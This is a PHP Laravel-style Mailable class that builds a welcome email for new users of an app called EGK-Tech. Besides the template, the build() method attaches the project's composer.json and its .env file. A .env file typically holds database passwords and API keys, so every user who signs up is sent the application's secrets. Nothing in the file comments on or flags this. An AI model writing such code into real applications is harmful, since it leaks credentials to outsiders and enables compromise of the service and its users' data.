<?php

namespace App\Mail;

use App\Mail\Mailer\Mailable;
use App\Models\User;

class Welcome extends Mailable
{
    protected $user;

    public function __construct(User $user)
    {
        $this->user = $user;
    }

    public function build()
    {
        return $this->subject("Welcome to EGK-Tech {$this->user->name}")
            ->view('emails/welcome.twig')
            ->attach(__DIR__ . '/../../composer.json')
            ->attach(__DIR__ . '/../../.env')
            ->with([
                'user' => $this->user
            ]);
    }
}